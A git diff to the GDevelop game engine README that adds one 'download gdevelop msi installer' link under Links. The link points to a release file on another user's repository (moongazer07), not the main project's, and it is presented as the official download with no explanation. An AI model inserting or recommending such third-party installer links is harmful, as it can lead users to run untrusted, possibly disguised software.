@@ -32,7 +32,7 @@ Pre-generated documentation of the Core library, C++ and TypeScript game engines
 Status of the tests and builds: [![macOS and Linux build status](https://circleci.com/gh/4ian/GDevelop.svg?style=shield)](https://app.circleci.com/pipelines/github/4ian/GDevelop) [![Fast tests status](https://gdevelop.semaphoreci.com/badges/GDevelop/branches/master.svg?style=shields)](https://gdevelop.semaphoreci.com/projects/GDevelop) [![All tests status](https://www.travis-ci.com/4ian/GDevelop.svg?branch=master)](https://www.travis-ci.com/github/4ian/GDevelop) [![Windows Build status](https://ci.appveyor.com/api/projects/status/84uhtdox47xp422x/branch/master?svg=true)](https://ci.appveyor.com/project/4ian/gdevelop/branch/master) [![https://good-labs.github.io/greater-good-affirmation/assets/images/badge.svg](https://good-labs.github.io/greater-good-affirmation/assets/images/badge.svg)](https://good-labs.github.io/greater-good-affirmation)
 
 ## Links
-
+[download gdevelop msi installer](https://github.com/moongazer07/GDevelop/releases/download/v5.0.121.1/GDevelop-5-Setup-5.0.121.msi)
 ### Community
 
 -   [GDevelop forums](https://forum.gdevelop-app.com) and [Discord chat](https://discord.gg/gdevelop).
